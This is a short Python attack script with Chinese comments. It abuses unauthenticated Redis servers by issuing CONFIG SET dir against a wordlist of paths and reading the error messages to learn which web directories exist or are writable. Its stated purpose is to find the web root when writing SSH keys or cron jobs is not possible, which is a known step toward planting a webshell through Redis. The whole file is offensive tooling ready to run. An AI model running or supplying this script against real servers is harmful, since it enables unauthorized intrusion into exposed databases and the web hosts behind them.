#!/usr/bin/env python
# -*- encoding: utf-8 -*-

'''
@File    :   redisDirScan.py
@Time    :   2019/05/04 01:41:54
@Author  :   R3start 
'''

# 脚本说明 
# 此脚本用于测试 Rdies 未授权访问时，在没权限写ssh私钥和定时任务又不知道web绝对路径的情况下，进行WEB目录探测

import redis

r = redis.Redis(host='127.0.0.1', port=6379)
# r = redis.Redis(host='127.0.0.1', port=6379, password=123) #带密码认证
pathlist = []
rootPath = "/web/releases/"
try:
    for dirs in open("E:\\dirs.txt",'r',encoding='UTF-8'):
        # dirs = dirs.decode()
        dirslist = dirs.strip("\n")
        path = "%s%s" % (rootPath,str(dirslist))
        try:
            checkDir = r.config_set("dir",path)
            info = "当前路径: " + str(path) + "\t" + "存在！"
            pathlist.append(info)
            print(info)
        except Exception as e:
            if len(str(e)) == 45:
                print("当前路径: " + path + "\t" + " 不存在！")
            elif len(str(e)) == 35:
                info = "当前路径 " + path + "\t" + "没权限"
                pathlist.append(str(info))
                print(info)
            else :
                info = "当前路径 " + path  + "\t" +  str(e)
                pathlist.append(str(info))
                print(info)
except Exception as e:
    print("如果编码错误请检查字典中是否有乱码，错误信息：" + str(e))
print("===================== 探测完成 =====================")
for path_success in pathlist:
    print(path_success)
